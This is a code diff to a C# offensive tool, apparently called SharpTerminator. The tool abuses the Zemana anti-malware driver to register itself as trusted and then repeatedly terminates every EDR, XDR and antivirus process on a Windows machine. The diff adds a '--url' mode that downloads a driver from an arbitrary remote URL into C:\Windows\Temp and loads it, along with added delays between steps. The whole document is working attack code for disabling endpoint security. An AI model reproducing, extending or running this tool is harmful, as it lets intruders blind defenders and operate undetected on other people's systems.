@@ -1,6 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading;
 
@@ -86,6 +87,25 @@ class Program
         return true;
     }
 
+    static bool LoadDriverFromUrl(string driverUrl)
+    {
+        WebClient webClient = new WebClient();
+        string driverFileName = Path.GetFileName(driverUrl);
+        string driverPath = Path.Combine(@"C:\Windows\Temp", driverFileName);
+
+        try
+        {
+            webClient.DownloadFile(driverUrl, driverPath);
+            return LoadDriver(driverPath);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Failed to download and load the driver: " + ex.Message);
+            return false;
+        }
+    }
+
+
     static bool IsInEdrList(string processName)
     {
         string lowerProcessName = processName.ToLower();
@@ -152,31 +172,46 @@ class Program
 
     static void Main(string[] args)
     {
-        if (args.Length < 1)
+        if (args.Length < 2)
         {
-            Console.WriteLine("Driver file path argument is missing!");
+            Console.WriteLine("Invalid arguments!");
+            Console.WriteLine("Usage: SharpTerminator.exe --url <driverUrl> or SharpTerminator.exe --disk <driverPath>");
             return;
         }
 
-        string driverPath = args[0];
+        string argType = args[0].ToLower();
+        string driverArg = args[1];
 
-        if (!File.Exists(driverPath))
+        if (argType == "--url")
         {
-            Console.WriteLine("Driver not found!");
-            return;
+            Console.WriteLine("Loading driver from URL: " + driverArg);
+            if (!LoadDriverFromUrl(driverArg))
+            {
+                Console.WriteLine("Failed to download and load the driver from URL.");
+                return;
+            }
         }
-
-        Console.WriteLine("Loading {0} driver ..", Path.GetFileName(driverPath));
-
-        if (!LoadDriver(driverPath))
+        else if (argType == "--disk")
         {
-            Console.WriteLine("Failed to load driver. Try running the program as administrator!");
+            Console.WriteLine("Loading driver from disk: " + driverArg);
+            if (!LoadDriver(driverArg))
+            {
+                Console.WriteLine("Failed to load the driver from disk.");
+                return;
+            }
+        }
+        else
+        {
+            Console.WriteLine("Invalid argument type!");
+            Console.WriteLine("Usage: SharpTerminator.exe --url <driverUrl> or SharpTerminator.exe --disk <driverPath>");
             return;
         }
 
         Console.WriteLine("Driver loaded successfully!");
 
-        // Yeni eklenen servisi başlat
+        int startServiceDelayMilliseconds = 2000; 
+        int registerProcessDelayMilliseconds = 3000; 
+
         if (!StartService("Terminator"))
         {
             Console.WriteLine("Failed to start the service.");
@@ -185,10 +220,8 @@ class Program
 
         Console.WriteLine("Service started successfully!");
 
-        // Belirtilen süre kadar bekle
-        int waitTimeMilliseconds = 4000; // 4 saniye
-        Console.WriteLine("Waiting for {0} milliseconds...", waitTimeMilliseconds);
-        Thread.Sleep(waitTimeMilliseconds);
+        Console.WriteLine("Waiting for {0} milliseconds after starting the service...", startServiceDelayMilliseconds);
+        Thread.Sleep(startServiceDelayMilliseconds);
 
         IntPtr hDevice = NativeMethods.CreateFile(
             @"\\.\\ZemanaAntiMalware",
@@ -205,6 +238,9 @@ class Program
             return;
         }
 
+        Console.WriteLine("Waiting for {0} milliseconds after opening handle to driver...", startServiceDelayMilliseconds);
+        Thread.Sleep(startServiceDelayMilliseconds);
+
         uint input = (uint)Process.GetCurrentProcess().Id;
 
         if (!NativeMethods.DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, ref input, sizeof(uint),
@@ -215,6 +251,9 @@ class Program
         }
 
         Console.WriteLine("Process registered in the trusted list!");
+
+        Console.WriteLine("Waiting for {0} milliseconds after registering the process...", registerProcessDelayMilliseconds);
+        Thread.Sleep(registerProcessDelayMilliseconds);
 
         Console.WriteLine("Terminating ALL EDR/XDR/AVs ..");
         Console.WriteLine("Keep the program running to prevent Windows services from restarting them");
@@ -228,7 +267,6 @@ class Program
                 Thread.Sleep(700);
         }
     }
-
     class NativeMethods
     {
         public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
